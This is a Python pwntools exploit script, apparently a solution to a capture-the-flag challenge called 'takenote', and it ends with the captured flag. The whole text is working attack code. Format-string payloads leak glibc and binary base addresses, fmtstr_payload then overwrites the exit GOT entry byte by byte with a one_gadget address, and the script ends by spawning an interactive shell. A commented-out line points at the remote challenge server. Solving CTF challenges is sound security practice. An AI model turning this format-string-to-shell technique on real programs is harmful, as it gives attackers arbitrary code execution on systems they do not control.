from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', '''
    b *(run+619)
    continue
''')

# p = remote('takenote.kctf-453514-codelab.kctf.cloud', 1337)

def init_num_notes(num_notes):
    p.recvuntil(b'How many notes do you need to write?\n\n')
    p.sendline(str(num_notes).encode())

def write_note(index, note):
    p.recvuntil(b'3. Exit\n\n')
    p.sendline(b'1')
    p.recvuntil(b']\n')
    p.sendline(str(index).encode())
    p.sendline(note)

def read_note(index):
    p.recvuntil(b'3. Exit\n\n')
    p.sendline(b'2')
    p.recvuntil(b'Which note do you want to print?\n\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'Your note reads:\n\n')
    return p.recvline().strip()

def exit():
    p.recvuntil(b'3. Exit\n\n')
    p.sendline(b'3')

init_num_notes(0x10)

write_note(0, b'%23$p')
glibc_base_addr = int(read_note(0).decode(), 16) - 0x24083
one_gadget_addr = glibc_base_addr + 0xe3b01
log.info(f'one gadget address: {hex(one_gadget_addr)}')

write_note(1, b'%14$p')
elf_base_addr = int(read_note(1).decode(), 16) - 0x15b0
exit_got_addr = elf_base_addr + 0x3770
log.info(f'exit got address: {hex(exit_got_addr)}')

for i in range(6):
    note_index = i + 2
    offset = i
    byte_value = (one_gadget_addr >> (8 * i)) & 0xff
    write_note(note_index, fmtstr_payload(12, {exit_got_addr + offset: byte_value}))
    read_note(note_index)

exit()

p.interactive()

# wctf{m3m0ry_l4y0u7_1s_crUc1Al_f0r_3xpL01t5}